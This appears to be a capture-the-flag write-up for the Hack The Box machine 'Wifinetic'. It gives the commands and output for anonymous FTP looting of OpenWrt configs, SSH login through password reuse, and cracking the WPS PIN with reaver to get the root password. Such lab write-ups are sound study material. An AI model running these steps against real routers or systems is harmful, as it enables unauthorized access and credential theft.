# HTB Wifinetic — Writeup
**OS:** Ubuntu 20.04
**Difficulty:** Easy
**Attack Vector:** FTP anon access → WiFi password reuse → WPS PIN crack via reaver → root
**System:** Arch Linux

---

## Summary

Wifinetic is a WiFi-themed Linux machine. Anonymous FTP exposes OpenWrt configuration backups including the WiFi password. User `netadmin` reused the WiFi password for their local account, giving SSH access. Privilege escalation exploits `reaver` having `cap_net_raw` capability — cracking the WPS PIN on the local access point reveals root's password.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV -Pn -T4 10.129.229.90
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
53/tcp open  tcpwrapped
```

### FTP Enumeration
```bash
ftp 10.129.229.90
# anonymous:(blank)
```

FTP exposes an OpenWrt `/etc` backup containing:
- `config/wireless` — WiFi password in plaintext
- `passwd` — user list including `netadmin`

---

## Exploitation

### Step 1 — Extract WiFi Password from FTP

From `config/wireless`:
```
config wifi-iface 'wifinet0'
    option ssid 'OpenWrt'
    option encryption 'psk'
    option key 'VeRyUniUqWiFIPasswrd1!'
    option wps_pushbutton '1'
```

WiFi password: `VeRyUniUqWiFIPasswrd1!`

### Step 2 — SSH as netadmin (Password Reuse)

```bash
ssh netadmin@10.129.229.90
# Password: VeRyUniUqWiFIPasswrd1!
```

User flag:
```bash
cat ~/user.txt
```

### Step 3 — Privilege Escalation via Reaver (WPS Crack)

Check capabilities:
```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/reaver = cap_net_raw+ep
```

`reaver` has `cap_net_raw` — can perform raw packet injection for WPS attacks.

Enumerate wireless interfaces:
```bash
iwconfig
```

- `wlan0` — AP mode (BSSID: `02:00:00:00:00:00`, SSID: OpenWrt)
- `mon0` — already in monitor mode

Crack WPS PIN:
```bash
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```

```
[+] Pin cracked in 3 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
```

### Step 4 — Root

```bash
su root
# Password: WhatIsRealAnDWhAtIsNot51121!
cat /root/root.txt
```

---

## Flags

```
User: <submitted>
Root: <submitted>
```

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| None this time | Straightforward box — no Arch-specific issues |

| Lesson | Detail |
|---|---|
| Always check FTP anonymous access | Config backups often contain creds |
| Password reuse is common | WiFi password → local account |
| `getcap` is essential for Linux privesc | Capabilities can grant root-level powers to regular binaries |
| WPS is insecure | Default PIN `12345670` cracked in 3 seconds |
| `mon0` already existed | Check `iwconfig` before trying to create monitor interfaces |

---

## Tools Used

- `nmap` — reconnaissance
- `ftp` — anonymous access to OpenWrt config backups
- `reaver` — WPS PIN cracking
- `iw` / `iwconfig` — wireless interface enumeration

---

*Seven machines down. WiFi passwords: the gift that keeps on giving.* 🏆
